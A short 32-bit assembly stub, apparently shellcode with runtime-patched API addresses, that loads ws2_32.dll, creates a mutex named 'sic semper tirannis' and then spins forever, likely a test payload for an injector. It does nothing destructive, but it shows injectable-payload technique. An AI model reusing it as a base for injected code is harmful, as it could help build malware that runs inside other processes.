   ;stub.CreateMutexA
   ;stub.LoadLibraryA

   [bits 32]

   stub:
           mov edi,dword 0
      .CreateMutexA equ $-4
           mov ebx,dword 0
      .LoadLibraryA equ $-4
       call .name
       db "ws2_32.dll",0
       db "sic semper tirannis",10,0
     .name:
       mov esi,[esp]
       call ebx
     .get0:
       lodsb
       test al,al
       jnz .get0
           sub ecx,ecx
       push esi
           push ecx
           push ecx
           call edi
     .hang:
       jmp short .hang
